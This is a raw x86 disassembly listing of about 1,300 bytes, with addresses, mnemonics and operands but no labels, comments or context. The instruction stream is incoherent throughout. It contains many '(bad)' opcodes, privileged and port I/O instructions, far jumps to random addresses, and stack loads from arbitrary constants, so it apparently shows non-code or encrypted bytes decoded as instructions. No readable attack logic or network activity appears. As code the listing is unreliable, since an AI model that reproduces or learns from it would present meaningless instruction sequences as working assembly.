  416f4b:	mov    bl,BYTE PTR [ecx-0x3e50f0c1]
  416f51:	add    esp,eax
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	mov    eax,0x3744c177
  416f6f:	sbb    DWORD PTR [edi+0x70],edi
  416f72:	mov    ecx,0xa770707e
  416f77:	push   ecx
  416f78:	sub    DWORD PTR [ecx-0x38],eax
  416f7b:	xchg   DWORD PTR fs:[eax-0x1d],eax
  416f7f:	ja     0x416f2c
  416f81:	aaa    
  416f82:	pop    ecx
  416f83:	sbb    BYTE PTR [edx-0x50],ah
  416f86:	mov    dl,0x33
  416f88:	lea    eax,[esp+ebp*4+0x4c9c461e]
  416f8f:	pop    ecx
  416f90:	js     0x416f85
  416f92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f93:	pop    ebx
  416f94:	mov    dl,0x6a
  416f96:	add    esp,DWORD PTR ds:0x3aef36aa
  416f9c:	sub    BYTE PTR [esi],ah
  416f9e:	or     BYTE PTR [ebp+0x4a0fac76],ah
  416fa4:	push   es
  416fa5:	pop    es
  416fa6:	jp     0x416f6a
  416fa8:	outs   dx,BYTE PTR ds:[esi]
  416fa9:	retf   0x1613
  416fac:	fdivrp st(1),st
  416fae:	pushf  
  416faf:	addr16 xor eax,0xef1add9c
  416fb5:	pop    es
  416fb6:	sbb    al,cl
  416fb8:	xor    eax,0x27dab450
  416fbd:	push   ebp
  416fbe:	adc    DWORD PTR [ebx],0x5b
  416fc1:	add    DWORD PTR [edx+0x12],ecx
  416fc4:	add    al,0xf7
  416fc6:	je     0x416fe1
  416fc8:	pushw  ds
  416fca:	outs   dx,DWORD PTR ds:[esi]
  416fcb:	xchg   ebx,eax
  416fcc:	call   0x47762115
  416fd1:	jg     0x41704f
  416fd3:	adc    edi,DWORD PTR [eax]
  416fd5:	xor    al,0xdf
  416fd7:	into   
  416fd8:	or     cl,BYTE PTR [ebx-0x6552c2e]
  416fde:	adc    DWORD PTR [esi],eax
  416fe0:	mov    ebp,0xb6468d53
  416fe5:	xchg   DWORD PTR [edi-0x551e94d8],edi
  416feb:	in     al,dx
  416fec:	int3   
  416fed:	push   ds
  416fee:	pop    ds
  416fef:	dec    ebp
  416ff0:	sbb    al,0x72
  416ff2:	mov    ah,0x45
  416ff4:	retf   
  416ff5:	inc    esp
  416ff6:	inc    ebp
  416ff7:	xchg   ebp,edx
  416ff9:	(bad)  
  416ffa:	popa   
  416ffb:	or     edx,ebx
  416ffd:	jecxz  0x416fa6
  416fff:	jb     0x416f8b
  417001:	fld    TBYTE PTR [ecx-0x2d]
  417004:	xchg   esi,eax
  417005:	xchg   ecx,eax
  417006:	sbb    DWORD PTR [esi+0x9ac4f08],0x9120bb2
  417010:	clc    
  417011:	ja     0x41702b
  417013:	add    dl,0x7a
  417016:	xor    DWORD PTR [ecx+ebx*1-0x2a],edx
  41701a:	lahf   
  41701b:	add    eax,0xf584d5a3
  417020:	test   BYTE PTR [esi+eiz*4-0x65],ch
  417024:	pop    es
  417025:	or     BYTE PTR [ebp+0x1edd4e8],0x84
  41702c:	fs pop edi
  41702e:	jecxz  0x417017
  417030:	add    ebp,DWORD PTR ds:0x95a75e8d
  417036:	sub    BYTE PTR [edx-0x62],al
  417039:	pop    eax
  41703a:	xchg   ebx,eax
  41703b:	sti    
  41703c:	iret   
  41703d:	xchg   DWORD PTR [edi],esp
  41703f:	aas    
  417040:	icebp  
  417041:	shl    BYTE PTR [ebx-0x1fe3dfd6],1
  417047:	in     eax,0x12
  417049:	mov    esp,0xc4c46ae9
  41704e:	add    ebp,ebp
  417050:	int3   
  417051:	into   
  417052:	sbb    BYTE PTR [edi-0x17],al
  417055:	lsl    ebp,WORD PTR [edi+0x5b4e912c]
  41705c:	addr16 cmp al,cl
  41705f:	add    BYTE PTR [esi-0x26],bl
  417062:	or     BYTE PTR [ebx-0x19193dce],cl
  417068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417069:	es xchg esi,eax
  41706b:	out    dx,al
  41706c:	jmp    0x41706b
  41706e:	out    0x56,eax
  417070:	add    cl,BYTE PTR [eax+0x19b4a85c]
  417076:	in     al,dx
  417077:	mov    BYTE PTR [esi+0x28],ah
  41707a:	inc    ecx
  41707b:	adc    DWORD PTR [esi-0xb],0x4f
  41707f:	clc    
  417080:	(bad)  
  417081:	mov    ds:0x6041cd8e,al
  417086:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417087:	es dec esi
  417089:	leave  
  41708a:	dec    ecx
  41708b:	fwait
  41708c:	sbb    al,0xa1
  41708e:	test   DWORD PTR [edx],ebp
  417090:	sub    DWORD PTR [edi+0x1b760aa2],edi
  417096:	arpl   WORD PTR [ecx+0x34],bp
  417099:	popa   
  41709a:	dec    esi
  41709b:	push   edx
  41709c:	and    BYTE PTR [edi],ch
  41709e:	je     0x4170d0
  4170a0:	aad    0x61
  4170a2:	ds dec esi
  4170a4:	repnz mov bh,BYTE PTR [esi]
  4170a7:	sbb    cl,BYTE PTR [esi+0x7b]
  4170aa:	imul   esi,ebx,0x822e525a
  4170b0:	xor    ecx,ebp
  4170b2:	and    ecx,edx
  4170b4:	add    DWORD PTR [ebx-0x58e6d875],edi
  4170ba:	loopne 0x41704f
  4170bc:	mov    esi,0x157fc3a3
  4170c1:	xor    al,0x54
  4170c3:	add    ebp,DWORD PTR [esi+0x5b]
  4170c6:	fcomip st,st(5)
  4170c8:	das    
  4170c9:	nop
  4170ca:	lods   eax,DWORD PTR ds:[esi]
  4170cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170cc:	jg     0x4170b2
  4170ce:	sbb    esp,edx
  4170d0:	fdivr  st,st(6)
  4170d2:	mov    al,ds:0xf8afa5b5
  4170d7:	clc    
  4170d8:	xor    BYTE PTR [ebp+0x6c4b4a2],cl
  4170de:	sub    edi,eax
  4170e0:	test   eax,edx
  4170e2:	test   al,0xb5
  4170e4:	or     dl,BYTE PTR [edx-0x590618b1]
  4170ea:	call   0xfcf34df9
  4170ef:	mul    ah
  4170f1:	jns    0x4170d0
  4170f3:	xor    esi,DWORD PTR [edi-0x8]
  4170f6:	jo     0x417100
  4170f8:	cmp    BYTE PTR [edx],cl
  4170fa:	loopne 0x417132
  4170fc:	les    esp,FWORD PTR [ebx+0x5dbbcf5a]
  417102:	fiadd  DWORD PTR [ebx+0x24]
  417105:	test   BYTE PTR [ebx+esi*1],ch
  417108:	mov    al,0x3b
  41710a:	and    edx,eax
  41710c:	mov    edi,0x4da52fe2
  417111:	sti    
  417112:	xor    DWORD PTR [ebx+0x23107e1],eax
  417118:	shr    DWORD PTR [edi+0x2b],cl
  41711b:	cmp    al,0x41
  41711d:	or     cl,BYTE PTR [eax]
  41711f:	repz shl ebp,0x5d
  417123:	(bad)  
  417124:	into   
  417125:	shr    DWORD PTR gs:0xd642f69c,1
  41712c:	les    ebp,FWORD PTR [esi+0x10fd3345]
  417132:	sub    DWORD PTR [ebx-0x18568f5f],0x53
  417139:	ret    0x4a26
  41713c:	fs jno 0x4170f4
  41713f:	daa    
  417140:	mov    WORD PTR [eax-0x697687bd],?
  417146:	mov    dh,0x3
  417148:	pop    ebp
  417149:	fbld   TBYTE PTR [edx+edi*4-0x3d]
  41714d:	xchg   ecx,eax
  41714e:	jl     0x417132
  417150:	popa   
  417151:	into   
  417152:	not    cl
  417154:	push   eax
  417155:	adc    DWORD PTR [ecx],eax
  417157:	mov    esp,esp
  417159:	jne    0x41712e
  41715b:	mov    cl,BYTE PTR [edx-0x7e]
  41715e:	sub    cl,BYTE PTR [esp+ebx*4+0x75b5ce10]
  417165:	sbb    eax,0x4de46a76
  41716a:	fs loope 0x417162
  41716d:	test   DWORD PTR [ebx+ecx*8],eax
  417170:	dec    ebp
  417171:	shl    BYTE PTR ds:0x27c84647,1
  417177:	push   es
  417178:	xor    esp,DWORD PTR [ebx-0x36f01096]
  41717e:	gs loope 0x417184
  417181:	and    eax,0x579e05d3
  417186:	mov    edi,0xda795e05
  41718b:	xchg   ebp,eax
  41718c:	add    esi,ecx
  41718e:	or     al,dl
  417190:	adc    edi,DWORD PTR [ecx-0x64791924]
  417196:	std    
  417197:	mov    bl,0xdd
  417199:	into   
  41719a:	jg     0x4171ce
  41719c:	xor    eax,0x61f751f4
  4171a1:	sub    bl,BYTE PTR [esi+0x76ef4747]
  4171a7:	ins    DWORD PTR es:[edi],dx
  4171a8:	repz call 0xc89e:0x68716700
  4171b0:	push   ecx
  4171b1:	sbb    al,0x10
  4171b3:	out    dx,eax
  4171b4:	push   edi
  4171b5:	jno    0x417206
  4171b7:	push   ss
  4171b8:	and    al,0xa1
  4171ba:	or     DWORD PTR [edx-0x432b95ca],edi
  4171c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171c1:	pop    esp
  4171c2:	push   ss
  4171c3:	jmp    0xcda56f6f
  4171c8:	dec    ebx
  4171c9:	push   0x7d
  4171cb:	and    al,0xaa
  4171cd:	mov    ss,ebp
  4171cf:	and    al,0x5b
  4171d1:	jo     0x417208
  4171d3:	hlt    
  4171d4:	pop    edi
  4171d5:	jnp    0x417192
  4171d7:	bound  esp,QWORD PTR [esi-0x7a906997]
  4171dd:	outs   dx,DWORD PTR ds:[esi]
  4171de:	and    cl,BYTE PTR [ecx-0x7]
  4171e1:	add    BYTE PTR [ebx],dh
  4171e3:	test   eax,0x85da84
  4171e8:	(bad)  
  4171e9:	sahf   
  4171ea:	mov    DWORD PTR [eax+0x42b7db3d],ecx
  4171f0:	xchg   edx,eax
  4171f1:	jns    0x41725b
  4171f3:	pusha  
  4171f4:	cwde   
  4171f5:	loope  0x4171c4
  4171f7:	push   0x201dddc1
  4171fc:	adc    al,0x21
  4171fe:	imul   bh
  417200:	mov    dh,0x47
  417202:	rol    BYTE PTR [ecx+0x15],1
  417205:	dec    eax
  417206:	sub    eax,0xc6792e45
  41720b:	adc    ebx,0x46
  41720e:	xor    ah,bh
  417210:	repz jp 0x417238
  417213:	xor    bh,BYTE PTR [ebx]
  417215:	inc    ecx
  417216:	jmp    0x84bb94c3
  41721b:	aam    0xf0
  41721d:	pop    eax
  41721e:	clc    
  41721f:	(bad)  
  417220:	mov    BYTE PTR [edi-0x14],ah
  417223:	cs push es
  417225:	cmc    
  417226:	popf   
  417227:	and    DWORD PTR [edx+ecx*4+0x5],0x892716a0
  41722f:	jecxz  0x4171bf
  417231:	dec    ecx
  417232:	mov    ds:0x14b5a69e,eax
  417237:	rcr    DWORD PTR [eax],0x5
  41723a:	(bad)  
  41723b:	aaa    
  41723c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41723d:	dec    edx
  41723e:	inc    ebx
  41723f:	add    ebx,DWORD PTR [edx+ebx*1]
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	dec    edx
  417255:	pop    esp
  417256:	ret    
  417257:	les    esi,FWORD PTR [eax+0x26]
  41725a:	jg     0x4172cc
  41725c:	mov    ecx,0xaf70707e
  417261:	jnp    0x4172cf
  417263:	and    ah,bl
  417265:	push   ecx
  417266:	aaa    
  417267:	adc    edx,DWORD PTR [esi]
  417269:	cmc    
  41726a:	add    BYTE PTR [esi-0x7a],bh
  41726d:	ss popa 
  41726f:	mov    dl,0x70
  417271:	jo     0x417264
  417273:	jnp    0x4172d5
  417275:	adc    cl,dl
  417277:	sbb    eax,edi
  417279:	or     BYTE PTR [edi],dl
  41727b:	mov    bl,0x10
  41727d:	jg     0x417215
  41727f:	lahf   
  417280:	jle    0x417269
  417282:	rol    DWORD PTR [ecx-0x440b6951],1
  417288:	cdq    
  417289:	xchg   ah,dh
  41728b:	add    DWORD PTR gs:[esi-0x5a65b958],0x476b62b7
  417296:	mov    esp,0x413022a
  41729b:	xchg   esi,eax
  41729c:	add    eax,0x9c49a3b3
  4172a1:	dec    ebp
  4172a2:	cmp    ebp,DWORD PTR [edi-0x63748834]
  4172a8:	sbb    al,0x9c
  4172aa:	mov    BYTE PTR [ecx+0x1],al
  4172ad:	out    0x7c,al
  4172af:	or     eax,0x629ccdcc
  4172b4:	sbb    BYTE PTR [ecx],dh
  4172b6:	mov    ds:0x60e85957,al
  4172bb:	mov    edx,0x63a06cc4
  4172c0:	scas   eax,DWORD PTR es:[edi]
  4172c1:	or     DWORD PTR [ecx-0x35],0x9fe1f7ba
  4172c8:	xor    BYTE PTR [edx+0x1dea2cb0],ah
  4172ce:	mov    ch,0xdf
  4172d0:	mov    eax,0x2b1db03f
  4172d5:	test   al,0x4c
  4172d7:	inc    ebp
  4172d8:	ror    eax,0xdf
  4172db:	imul   ebx,DWORD PTR [eax],0xffffffc2
  4172de:	fnstenv ds:0x996e7b74
  4172e4:	cld    
  4172e5:	adc    BYTE PTR [edi-0x6e],bh
  4172e8:	cwde   
  4172e9:	mov    dl,0x28
  4172eb:	push   ds
  4172ec:	jo     0x417352
  4172ee:	cwde   
  4172ef:	or     bh,dl
  4172f1:	xchg   edx,eax
  4172f2:	into   
  4172f3:	and    DWORD PTR [ebx-0x58],ebp
  4172f6:	ja     0x4172db
  4172f8:	jb     0x4172a8
  4172fa:	(bad)  
  4172fc:	mov    ds:0x725da39b,al
  417301:	pandn  mm1,QWORD PTR [esi+0x77ce06e0]
  417308:	push   edi
  417309:	inc    edi
  41730a:	or     eax,0x69904379
  41730f:	push   0xffffffb8
  417311:	std    
  417312:	sbb    BYTE PTR [edi-0x47],dh
  417315:	dec    ecx
  417316:	inc    DWORD PTR [ebx]
  417318:	int    0xc5
  41731a:	outs   dx,DWORD PTR ds:[esi]
  41731b:	lea    ecx,[ecx]
  41731d:	sbb    ecx,DWORD PTR [ebp+0x1f]
  417320:	xor    DWORD PTR [ebx+ebx*4],esi
  417323:	xchg   ebp,eax
  417324:	les    ebp,FWORD PTR [ebx-0x5922eb48]
  41732a:	mov    al,ds:0x31ac22f
  41732f:	ret    0x783c
  417332:	mov    DWORD PTR ds:0x46aa1667,ebx
  417338:	(bad)  
  417339:	scas   eax,DWORD PTR es:[edi]
  41733a:	repz mov dh,0x79
  41733d:	outs   dx,BYTE PTR ds:[esi]
  41733e:	std    
  41733f:	aaa    
  417340:	cmp    ebp,0x1c
  417343:	retf   
  417344:	xor    al,0xf2
  417346:	ret    
  417347:	dec    BYTE PTR [edx]
  417349:	out    0x36,al
  41734b:	adc    WORD PTR [ebx],dx
  41734e:	iret   
  41734f:	lahf   
  417350:	daa    
  417351:	push   ebp
  417352:	dec    edx
  417353:	xchg   edi,eax
  417354:	in     eax,dx
  417355:	jl     0x417346
  417357:	sbb    eax,0xb47886eb
  41735c:	jmp    0x5367:0x24adc674
  417363:	mov    ebp,0x35a805d1
  417368:	xchg   ebp,eax
  417369:	pop    ebp
  41736a:	ja     0x417381
  41736c:	mov    esp,0x8ecc811f
  417371:	imul   esi,DWORD PTR [esi],0xffffff88
  417374:	mov    bl,0xab
  417376:	test   al,0xee
  417378:	imul   ebx,DWORD PTR [eax+0x27e73ea0],0xffffffe9
  41737f:	addr16 fucom st(6)
  417382:	or     DWORD PTR [ebx+0x26a10c00],0x7b
  417389:	mov    ecx,0xd79fa927
  41738e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41738f:	sar    BYTE PTR [eax],1
  417391:	pop    ds
  417392:	inc    ebp
  417393:	lds    edi,FWORD PTR [ebp-0x3]
  417396:	(bad)  
  417397:	cld    
  417398:	pop    eax
  417399:	dec    edx
  41739a:	fadd   st,st(6)
  41739c:	or     DWORD PTR [ebp-0x2f],esp
  41739f:	ror    BYTE PTR [edx-0x6bd85c9e],cl
  4173a5:	dec    esi
  4173a6:	push   0xffffffc7
  4173a8:	pusha  
  4173a9:	(bad)  
  4173aa:	ror    dl,0x39
  4173ad:	mov    ebp,0x7bd92ad7
  4173b2:	aam    0x29
  4173b4:	loope  0x4173f4
  4173b6:	and    dh,BYTE PTR [eax-0x71cec71c]
  4173bc:	mov    ecx,DWORD PTR [ebx-0x12eeb199]
  4173c2:	jbe    0x4173bb
  4173c4:	sub    edi,esi
  4173c6:	push   0x7a
  4173c8:	dec    edx
  4173c9:	jmp    0xe791f8bf
  4173ce:	dec    edx
  4173cf:	xor    dh,0x29
  4173d2:	je     0x417430
  4173d4:	mov    edx,0xe91b3d3d
  4173d9:	sbb    al,0x62
  4173db:	dec    ebx
  4173dc:	popf   
  4173dd:	pop    esp
  4173de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173df:	stos   BYTE PTR es:[edi],al
  4173e0:	daa    
  4173e1:	fisubr WORD PTR [edi+0x24]
  4173e4:	(bad)  
  4173e5:	push   ebx
  4173e6:	clc    
  4173e7:	push   edi
  4173e8:	jecxz  0x4173ab
  4173ea:	or     ecx,ebp
  4173ec:	xchg   ebp,eax
  4173ed:	pop    ds
  4173ee:	nop
  4173ef:	adc    al,0xba
  4173f1:	nop
  4173f2:	rcr    DWORD PTR [ebx-0x78],0x91
  4173f6:	mov    ss,WORD PTR [esi]
  4173f8:	jmp    0x9e73:0x468b3f71
  4173ff:	sar    BYTE PTR [edi+edx*1+0x48b98f24],1
  417406:	mov    cl,0x39
  417408:	icebp  
  417409:	in     al,dx
  41740a:	cwde   
  41740b:	hlt    
  41740c:	push   ecx
  41740d:	lods   eax,DWORD PTR ds:[esi]
  41740e:	clc    
  41740f:	adc    DWORD PTR [eax+0x52],ecx
  417412:	hlt    
  417413:	out    dx,eax
  417414:	retf   
  417415:	sbb    esp,DWORD PTR ds:[edi]
  417418:	jo     0x417445
  41741a:	adc    ecx,DWORD PTR [ebp+0x55]
  41741d:	les    edx,FWORD PTR [eax-0x25]
  417420:	xchg   edx,eax
  417421:	(bad)  
  417422:	xchg   edx,eax
  417423:	sbb    ah,bl
  417425:	sub    DWORD PTR [ecx+esi*4-0x4f],eax
  417429:	dec    ebp
  41742a:	lds    ebx,FWORD PTR [ecx-0x2cf803cb]
  417430:	jecxz  0x417468
  417432:	fistp  WORD PTR [edi]
  417434:	mov    esi,0x6e5e42aa
  417439:	sbb    ch,BYTE PTR [edx-0x7528d7c5]
  41743f:	and    BYTE PTR [edi+0x10],ch
  417442:	mov    eax,0x48656cb5
  417447:	mov    al,ds:0xb324d45a
  41744c:	xchg   edi,eax
  41744d:	xchg   DWORD PTR [edx+0x7d],edi
  417450:	sbb    ah,BYTE PTR [edi+0x1a9d7aed]
  417456:	cli    
  417457:	jae    0x417467
  417459:	mov    eax,ds:0x5aa880fe
  41745e:	stos   BYTE PTR es:[edi],al
  41745f:	or     DWORD PTR [edi-0x2b],ecx
  417462:	lods   eax,DWORD PTR ds:[esi]
  417463:	neg    DWORD PTR [edi-0x43ccc079]
  417469:	aas    
  41746a:	jns    0x417492
  41746c:	dec    esi
  41746d:	leave  
  41746e:	scas   al,BYTE PTR es:[edi]
  41746f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417470:	jmp    0x8454:0xf0cbe366
  417477:	psubsw mm5,QWORD PTR [ecx]
  41747a:	adc    DWORD PTR [eax],edx
  41747c:	(bad)  
  41747d:	and    eax,0x19358702
  417482:	lea    ebp,[ebp-0x20f351a1]
  417488:	adc    al,0x95
  41748a:	add    edx,DWORD PTR [ecx+0x47]
  41748d:	ret    
  41748e:	mov    WORD PTR [ecx],ss
  417490:	out    0x92,eax
  417492:	pop    eax
  417493:	inc    si
  417495:	jmp    0xc592beaf
  41749a:	xchg   ebp,eax
  41749b:	aas    
  41749c:	out    0x64,eax
  41749e:	jns    0x417423
  4174a0:	in     eax,dx
  4174a1:	jne    0x41744a
  4174a3:	mov    eax,0x420efd1a
  4174a8:	push   es
  4174a9:	jecxz  0x417451
  4174ab:	push   0xffffffc2
  4174ad:	inc    edx
  4174ae:	pop    ecx
  4174af:	mov    edi,DWORD PTR [ebp+0x60]
  4174b2:	into   
  4174b3:	cwde   
  4174b4:	aam    0x40
  4174b6:	and    DWORD PTR [ecx],ebx
  4174b8:	mov    edi,0x88d61986
  4174bd:	vmread DWORD PTR [edi-0x29],ecx
  4174c1:	ja     0x4174e6
  4174c3:	stos   BYTE PTR es:[edi],al
  4174c4:	mov    esi,0xd9282127
  4174c9:	mov    WORD PTR [eax-0x70],fs
  4174cc:	dec    ebp
  4174cd:	inc    ebx
  4174ce:	leave  
  4174cf:	sbb    eax,0x46e9076f
  4174d4:	int3   
  4174d5:	sbb    ah,BYTE PTR [edx-0x71]
  4174d8:	into   
  4174d9:	mov    bh,0x63
  4174db:	stc    
  4174dc:	mov    eax,0x6646ecd4
  4174e1:	or     al,ah
  4174e3:	popf   
  4174e4:	icebp  
  4174e5:	stos   DWORD PTR es:[edi],eax
  4174e6:	bound  ebx,QWORD PTR [ecx-0x38]
  4174e9:	std    
  4174ea:	push   ecx
  4174eb:	push   eax
  4174ec:	icebp  
  4174ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174ee:	xchg   edi,eax
  4174ef:	add    eax,0xa56cafb0
  4174f4:	sub    DWORD PTR [ebx+0x4a219e31],0x3f
  4174fb:	ror    ecx,1
  4174fd:	popf   
  4174fe:	ret    
  4174ff:	pop    edi
  417500:	xchg   ebp,eax
  417501:	jns    0x4174fd
  417503:	mov    edx,0x156b6600
  417508:	mov    dl,0x40
  41750a:	ja     0x417566
  41750c:	mov    esp,0x3810e592
  417511:	rcr    BYTE PTR [eax+0x5948d42f],cl
  417517:	xchg   edx,eax
  417518:	(bad)
  41751c:	jmp    0x925c:0xdb1db6a1
  417523:	in     eax,0xef
  417525:	cmp    dh,BYTE PTR [ebx+0x5d01d233]
  41752b:	hlt    
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    DWORD PTR [esi+ebp*2-0x27],edx
  417545:	jb     0x417500
  417547:	and    al,0x7f
  417549:	jo     0x417504
  41754b:	jle    0x4175bd
  41754d:	jo     0x41751b
  41754f:	inc    esi
  417550:	lods   al,BYTE PTR ds:[esi]
  417551:	sub    ecx,DWORD PTR [edi+0x45]
  417554:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417555:	push   esp
  417556:	jl     0x41755f
  417558:	dec    edi
  417559:	push   ecx
  41755a:	jp     0x4175cb
  41755c:	push   esp
  41755d:	mov    ds:0xd5635997,al
  417562:	push   ebx
  417563:	test   al,0x2a
  417565:	sar    BYTE PTR [edx+0x21],cl
  417568:	pop    eax
  417569:	cmp    BYTE PTR [edx-0xc],dl
  41756c:	add    BYTE PTR [edx],0x23
  41756f:	cmp    edi,DWORD PTR [ebx]
  417571:	lods   eax,DWORD PTR ds:[esi]
  417572:	mov    ds:0x88733c44,al
  417577:	mov    esp,0xf600e44c
  41757c:	pushf  
  41757d:	sti    
  41757e:	fstp   TBYTE PTR [esi-0x69a4309]
  417584:	jo     0x417564
  417586:	popa   
  417587:	test   DWORD PTR [ebp-0x16],esi
  41758a:	dec    eax
  41758b:	pushf  
  41758c:	dec    esi
  41758d:	in     al,0xda
  41758f:	sbb    edx,0xddbc5253
  417595:	cli    
  417596:	shr    BYTE PTR [ebp+0x65950066],1
  41759c:	clc    
  41759d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41759e:	sub    ah,BYTE PTR [ecx-0x25]
  4175a1:	rol    edi,1
  4175a3:	cmp    al,al
  4175a5:	mov    al,ds:0x82f400e
  4175aa:	fstp   QWORD PTR [esi]
  4175ac:	pushf  
  4175ad:	in     al,dx
  4175ae:	ins    BYTE PTR es:[edi],dx
  4175af:	push   cs
  4175b0:	jo     0x41757a
  4175b2:	jmp    DWORD PTR [edi-0x250141f6]
  4175b8:	(bad)  
  4175b9:	push   esi
  4175ba:	mov    al,ds:0xcb066859
  4175bf:	out    dx,al
  4175c0:	ror    DWORD PTR [edi+0x1df73f31],cl
  4175c6:	fcomi  st,st(5)
  4175c8:	rol    BYTE PTR [edi-0x4ac156fb],cl
  4175ce:	icebp  
  4175cf:	outs   dx,DWORD PTR ds:[esi]
  4175d0:	aam    0x2f
  4175d2:	rcl    ecx,0xaf
  4175d5:	ret    
  4175d6:	stos   BYTE PTR es:[edi],al
  4175d7:	fiadd  DWORD PTR [eax+0x4b6c313e]
  4175dd:	enter  0x57d6,0xc
  4175e1:	add    BYTE PTR [ecx+0x59],bh
  4175e4:	ficomp WORD PTR [ecx+edx*8+0x13ca1691]
  4175eb:	inc    ebx
  4175ec:	xor    esi,eax
  4175ee:	jns    0x4175d2
  4175f0:	and    ah,BYTE PTR [edi-0x72]
  4175f3:	jl     0x4175cc
  4175f5:	je     0x41760e
  4175f7:	inc    eax
  4175f8:	outs   dx,DWORD PTR ds:[esi]
  4175f9:	and    bl,BYTE PTR [esi+edx*4]
  4175fc:	jmp    0x7299:0xc91cdec0
  417603:	icebp  
  417604:	test   al,0x8c
  417606:	xor    DWORD PTR [ebx-0xa830b23],ecx
  41760c:	loop   0x4175be
  41760e:	dec    ebx
  41760f:	push   ss
  417610:	lahf   
  417611:	arpl   WORD PTR [ebx+0x41],di
  417614:	jp     0x417693
  417616:	jno    0x41762c
  417618:	and    DWORD PTR [esp+ecx*8],ebp
  41761b:	sbb    eax,0x8e2867a6
  417620:	test   ch,0xc2
  417623:	cmp    eax,0x84b83abb
  417628:	or     al,0x73
  41762a:	gs pusha 
  41762c:	inc    esp
  41762d:	dec    edi
  41762e:	scas   eax,DWORD PTR es:[edi]
  41762f:	pop    ds
  417630:	and    dh,dl
  417632:	fs stc 
  417634:	and    edx,eax
  417636:	rol    DWORD PTR [ebx],1
  417638:	cmp    BYTE PTR [ebx+0x6b66aea4],0x55
  41763f:	(bad)  
  417640:	shl    DWORD PTR [ecx+0x21541e66],1
  417646:	inc    esi
  417647:	mov    ?,WORD PTR [ebx+0xfcc79f]
  41764d:	pop    esp
  41764e:	mov    ds:0xd072b58d,al
  417653:	add    DWORD PTR [edx],esp
  417655:	lds    esi,FWORD PTR [edx-0x29d7c66]
  41765b:	popa   
  41765c:	push   edi
  41765d:	inc    ecx
  41765e:	dec    esp
  41765f:	ss jmp 0xf794:0x76b84f11
  417667:	addr16 mov esi,fs
  41766a:	xchg   ebx,eax
  41766b:	lods   al,BYTE PTR ds:[esi]
  41766c:	rcl    ah,cl
  41766e:	inc    edx
  41766f:	jbe    0x41767a
  417671:	stc    
  417672:	xlat   BYTE PTR ds:[ebx]
  417673:	ja     0x4176a5
  417675:	lea    ecx,[esi-0x69e99af2]
  41767b:	pushf  
  41767c:	mov    ebx,0x927eb64
  417681:	add    edx,ebx
  417683:	jge    0x4176eb
  417685:	shl    DWORD PTR [edx-0x74],cl
  417688:	xchg   ecx,eax
  417689:	ds or  bh,bl
  41768c:	mov    dl,0xf0
  41768e:	push   eax
  41768f:	shr    esp,cl
  417691:	and    esp,esp
  417693:	or     ebx,edi
  417695:	gs add ecx,edx
  417698:	fwait
  417699:	test   DWORD PTR [edx+ecx*2+0x4f],edi
  41769d:	(bad)  
  41769f:	lods   eax,DWORD PTR ds:[esi]
  4176a0:	lods   eax,DWORD PTR ds:[esi]
  4176a1:	mov    al,ds:0xa93e6e47
  4176a6:	cmp    eax,0xb2c1ec28
  4176ab:	fwait
  4176ac:	mov    ds:0xd3e6e1b0,eax
  4176b1:	xor    eax,0xb46db640
  4176b6:	mov    dh,0x71
  4176b8:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4176ba:	inc    ecx
  4176bb:	mov    dl,0xf6
  4176bd:	not    ah
  4176bf:	retf   
  4176c0:	or     al,0xce
  4176c2:	jb     0x417671
  4176c4:	or     DWORD PTR [ebx+ebx*8+0x17],edi
  4176c8:	lods   al,BYTE PTR ds:[esi]
  4176c9:	dec    edi
  4176ca:	ror    dh,0x71
  4176cd:	and    eax,0xd60293b2
  4176d2:	mov    eax,0x8b2e3f71
  4176d7:	mov    DWORD PTR [ebx*8+0x4486ce55],esi
  4176de:	mov    ebx,0x88fb1c45
  4176e3:	cmp    BYTE PTR [edi*4+0xe20c7],cl
  4176ea:	and    al,BYTE PTR [eax-0x544943c9]
  4176f0:	or     ebx,ebx
  4176f2:	xchg   BYTE PTR [edx-0x6c],bh
  4176f5:	mov    dh,0x9d
  4176f7:	jmp    0x3d056861
  4176fc:	dec    ebp
  4176fd:	xor    DWORD PTR [ecx],ecx
  4176ff:	cmc    
  417700:	xor    al,0xcb
  417702:	int3   
  417703:	imul   ebx,ecx,0xa3ffb8dc
  417709:	dec    edx
  41770a:	dec    esi
  41770b:	retf   0xbc15
  41770e:	add    ecx,0xffffff88
  417711:	test   al,0x92
  417713:	div    al
  417715:	push   ds
  417716:	fidiv  DWORD PTR [ecx+0x39a43708]
  41771c:	popf   
  41771d:	inc    ecx
  41771e:	dec    edx
  41771f:	or     eax,0x224c951
  417724:	out    0xa4,al
  417726:	ds mov esp,0xc29fec09
  41772c:	xor    BYTE PTR [eax+0x7d],cl
  41772f:	and    eax,0xd84a7463
  417734:	mov    bh,0x10
  417736:	call   0xad55:0x7d02989d
  41773d:	(bad)  
